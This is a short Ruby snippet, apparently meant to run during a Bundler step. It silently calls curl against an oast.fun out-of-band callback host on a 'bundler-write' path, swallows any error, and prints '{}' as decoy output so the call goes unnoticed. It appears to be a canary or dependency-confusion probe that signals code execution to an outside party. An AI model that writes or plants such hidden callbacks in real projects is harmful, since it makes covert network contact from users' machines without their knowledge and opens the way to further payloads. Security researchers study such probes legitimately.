begin
  system("curl", "-sS", "--max-time", "20", "https://dc07pl9vnklashe99pggjyjdo5rfb3ijk.oast.fun/bundler-write")
rescue StandardError
end
puts "{}"
